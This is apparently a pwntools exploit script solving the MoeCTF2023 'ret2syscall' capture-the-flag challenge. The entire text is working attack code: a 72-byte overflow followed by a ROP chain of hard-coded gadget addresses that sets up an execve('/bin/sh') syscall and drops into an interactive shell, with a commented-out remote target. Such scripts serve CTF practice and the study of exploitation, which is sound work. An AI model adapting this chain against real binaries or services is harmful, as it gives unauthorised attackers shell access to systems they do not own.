# MoeCTF2023 ret2syscall
from pwn import *

warnings.filterwarnings("ignore", category=BytesWarning)

s = process('./ret2syscall')
# s = remote('localhost',33817)
elf = ELF('./ret2syscall', checksec=False)
context(log_level='debug', arch='amd64', os='linux')

pop_rax = 0x40117e
pop_rdi = 0x401180
pop_rsi_rdx = 0x401182
syscall_addr = 0x401185
binsh_addr = 0x404040
payload = flat('a' * (64 + 8), pop_rax, 59, pop_rdi, binsh_addr, pop_rsi_rdx, 0, 0, syscall_addr, 0)

s.sendafter('all?', payload)
s.interactive()
